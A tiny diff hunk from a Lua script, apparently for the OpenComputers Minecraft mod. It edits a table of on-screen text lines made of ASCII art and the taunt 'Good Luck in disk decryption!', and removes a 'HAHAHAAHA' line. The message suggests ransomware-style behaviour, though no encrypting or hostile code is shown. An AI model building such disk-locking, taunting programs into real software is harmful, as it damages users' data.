@@ -17,8 +17,6 @@ local textLines = {
   " ┈┈╭╱╱▕╋╋╋╋▏╲╲╮┈┈┈ ",
   " ┈┈╰╯╯┈╲▂▂╱┈╰╰╯┈┈┈ ",
   "Good Luck in disk decryption!",
-  "",
-  "HAHAHAAHA",
 }
  
 local component_invoke = component.invoke
